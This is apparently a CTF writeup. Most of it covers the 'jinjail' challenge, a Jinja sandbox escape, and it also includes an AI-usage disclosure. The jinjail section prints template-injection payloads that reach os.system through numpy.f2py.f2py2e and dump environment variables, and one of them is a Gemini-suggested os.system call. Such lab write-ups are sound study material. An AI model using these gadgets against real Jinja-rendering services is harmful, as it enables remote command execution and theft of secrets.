# C2C CTF 2026 Quals Writeup

## Challenges

* [misc/welcome]()
* [misc/jinjail]()
* [web/corp-mail]()
* [web/clicker]()
* [web/The Soldier of God, Rick]()
* [forensics/Log]()
* [forensics/Tattletale]()
* [reverse/bunaken]()
* [pwn/ns3]()
* [blockchain/tge]()
* [blockchain/convergence]()
* [blockchain/nexus]()

---

## misc/welcome

I know that this is just the **"sanity check"** challenge but the experience of getting the flag was hilarious, it's worth to mention here.

At first, i thought this was some kind of **OSINT** challenge and i start to search the flag from the official page, discord, every source i can find but got nothing,

Then somehow i clicked Home/Posts/Games menu on the sidebar and it's on the header the whole time

[image here]

It takes me about **2,5 hours** to realize that the flag was closer than i thought. People said *"Sometimes, all you need is a step back"* and i guess it is what it is

Flag: **`C2C{welcome_to_c2c}`**

No AI Usage here (obviously)

---

## misc/jinjail

In this challenge, we got a `.zip` file that contains theses files:

```bash
jinjail/
├── app.py
├── docker-compose.yml
├── Dockerfile
├── fix.c
├── flag.txt
└── requirements.txt
```

According to the title and description of the challenge, I first assume this challenge would be similar to `pyjail` challenges.

After analyzing the files, I came to conclusion that my goal is to execute `fix.c` by running `/fix help` command to read the flag.

```bash
int main(int argc, char *argv[]) {
    if (argc > 1 && strcasecmp(argv[1], "help") == 0) {    # Needs 'help' arg
        setuid(0);
        system("cat /root/flag.txt");    # read flag.txt
    } else {

```

In `app.py` there's `waf` function that limits my input.

Blocklist:
* No quotes (`"` or `'`)
* No operators (`+`, `-`, `/`, `\\`, `|`)
* Some functions are restricted (`fromfile`, `savetxt`, `load`, `array`, etc)

There're also limitation for certain characters:

* `(`, `)`, `[`, `]`, `{`, `}` limited to 3
* `,` limited to 10

This challenge also run in `SanboxEnvironment` which restrict access to sensitive attributes such as `__globals__` or `__builtins__`

Beside, in `app.py` we can see that `numpy` registered as global library in the environment. So we can use this to retrieve some characters from outputs.

So my initial plan was to build string `/fix help` by slicing the string from some outputs and put it together.

Here's some of my trial and errors:

```bash
┌─[lasangna@parrot]─[~/ctf/c2c/misc/jinjail]
└──╼ $nc challenges.1pc.tf 37979
>>> {{ numpy.os.system }}
Nope 
```

```bash
┌─[lasangna@parrot]─[~/ctf/c2c/misc/jinjail]
└──╼ $nc challenges.1pc.tf 37979
>>> {{ numpy.version }}
<module 'numpy.version' from '/usr/local/lib/python3.11/site-packages/numpy/version.py'> 
```

```bash
┌─[lasangna@parrot]─[~/ctf/c2c/misc/jinjail]
└──╼ $nc challenges.1pc.tf 37979
>>> {{ numpy.sys }}

```

After exploring several modules, i find that we can use `f2py` module. It's used to call Fortran compiler, but able to call shell internally.

```bash
┌─[lasangna@parrot]─[~/ctf/c2c/misc/jinjail]
└──╼ $nc challenges.1pc.tf 37979
>>> {{ numpy.f2py.main }}
<function main at 0x7f20fb9b8040> 
```

But after some trial, i can't find a way to build the string because of the limitation of `[]`.

Then, i stumble upon `f2py2e` submodule that recommended by **Gemini**

```bash
┌─[lasangna@parrot]─[~/ctf/c2c/misc/jinjail]
└──╼ $nc challenges.1pc.tf 37979
>>> {{ numpy.f2py.f2py2e.os.system }}
<built-in function system> 
```

This output shows that i can get `os` module by using `f2py2e` submodule. Then after several experiments, i tried to get the environment variables by using `numpy.f2py.f2py2e.os.environ`

```bash!
┌─[lasangna@parrot]─[~/ctf/c2c/misc/jinjail]
└──╼ $nc challenges.1pc.tf 37979
>>> {{ numpy.f2py.f2py2e.os.environ }}
environ({'KUBERNETES_SERVICE_PORT': '443', 'KUBERNETES_PORT': 'tcp://10.43.0.1:443', 'HOSTNAME': 'c2c2026-quals-misc-jinjail-bb7b127cef924561', 'HOME': '/home/ctf', 'PYTHONUNBUFFERED': '1', 'GPG_KEY': 'A035C8C19219BA821ECEA86B64E628F8D684696D', 'PYTHON_SHA256': '8d3ed8ec5c88c1c95f5e558612a725450d2452813ddad5e58fdb1a53b1209b78', 'PYTHONDONTWRITEBYTECODE': '1', 'KUBERNETES_PORT_443_TCP_ADDR': '10.43.0.1', 'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'KUBERNETES_PORT_443_TCP_PORT': '443', 'GZCTF_FLAG': 'C2C{damnnn_i_love_numpy_c62f51b9f296}', 'KUBERNETES_PORT_443_TCP_PROTO': 'tcp', 'LANG': 'C.UTF-8', 'PYTHON_VERSION': '3.11.14', 'KUBERNETES_SERVICE_PORT_HTTPS': '443', 'KUBERNETES_PORT_443_TCP': 'tcp://10.43.0.1:443', 'KUBERNETES_SERVICE_HOST': '10.43.0.1', 'PWD': '/app', 'GZCTF_TEAM_ID': '70', 'SOCAT_PID': '369', 'SOCAT_PPID': '1', 'SOCAT_VERSION': '1.8.0.3', 'USER': 'ctf', 'LOGNAME': 'ctf', 'SHELL': '/bin/bash', 'SOCAT_SOCKADDR': '10.244.9.142', 'SOCAT_SOCKPORT': '13337', 'SOCAT_PEERADDR': '10.244.0.0', 'SOCAT_PEERPORT': '53893'}) 
```

![jinjail solve](./assets/misc/jinjail/solve.png)

And as you can see, the flag is still in the environment variables. I got the flag not by executing `/fix help` but by the environment variables instead.

is this unintended? i guess we'll find out later...

Flag: **`C2C{damnnn_i_love_numpy_c62f51b9f296}`**

### AI Usage

yes, i use AI to solve this challenge. I used **Gemini 3 Pro** (at the begining but i got usage limit so then i use **Flash** afterward).

The Prompts i sent mostly about how i use Gemini to search for modules or submodules from `numpy` that i can use.

for example:
```
find me a module that i can use to get some character for '/fix help' string
```

I also sent the feedbacks after i tried the recommendation Gemini gave to evaluate.

Gemini sometimes provides a complete recommendation to directly obtain the `/fix help` string along with the required slicing, for example:

```bash
{{ numpy.f2py.f2py2e.os.system(numpy.f2py.f2py2e.os.sep ~ numpy.float64.name[0] ~ numpy.f2py.f2py2e.os.name[3:5]) }}
```

In this case, the methodology I used to verify the output was to break the expression down and execute each part individually (without applying slicing first) to confirm the intermediate outputs. For instance, I started by evaluating `numpy.f2py.f2py2e.os.name` on its own to understand its raw value.

---

